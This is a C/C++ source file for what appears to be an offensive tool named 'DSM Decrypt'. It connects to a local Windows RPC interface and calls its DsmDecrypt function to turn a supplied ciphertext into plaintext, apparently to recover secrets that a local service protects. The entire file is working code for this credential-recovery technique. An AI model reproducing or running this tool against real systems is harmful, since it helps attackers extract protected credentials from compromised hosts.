#include <windows.h>
#include <stdio.h>

#include "ICDBExt.h"

#pragma comment(lib, "RpcRT4.lib")


extern "C" void print_banner(const char* tool_name);


int main(int argc, char* argv[])
{
    print_banner("DSM Decrypt");

    if (argc != 2)
    {
        printf("%s <ciphertext>", argv[0]);
        return 1;
    }

    RPC_STATUS status;
    RPC_CSTR StringBinding;
    RPC_BINDING_HANDLE Binding;

    status = RpcStringBindingComposeA(
        NULL,
        (RPC_CSTR)"ncalrpc",
        NULL,
        (RPC_CSTR)"4e6038af-ab01-4bed-ac09-87abad5e6e81",
        NULL,
        &StringBinding
    );

    printf("[*] RpcStringBindingCompose status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    printf("[*] String binding: %s\n", StringBinding);

    status = RpcBindingFromStringBindingA(StringBinding, &Binding);
    printf("[*] RpcBindingFromStringBinding status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    status = RpcStringFreeA(&StringBinding);
    printf("[*] RpcStringFree status code: %d\n", status);

    if (status != 0)
    {
        return 1;
    }

    unsigned char* decrypted = NULL;

    RpcTryExcept
    {
        printf("[*] Requesting decryption from DSM via RPC...\n");

        char* crypted = argv[1];
        char* unknown = (char*)"";
        decrypted = (unsigned char*)LocalAlloc(255, sizeof(unsigned char));

        DsmDecrypt(Binding, (unsigned char*)crypted, (unsigned char*)unknown, &decrypted, 0);

        printf("[*] Decrypted: %s\n", decrypted);
    }

    RpcExcept(EXCEPTION_EXECUTE_HANDLER);
    {
        printf("[*] RPCError: %d - 0x%08x\n", RpcExceptionCode(), RpcExceptionCode());
    }

    RpcEndExcept
    {
        if (decrypted != NULL)
        {
            LocalFree(decrypted);
        }

        status = RpcBindingFree(&Binding);
    }
}
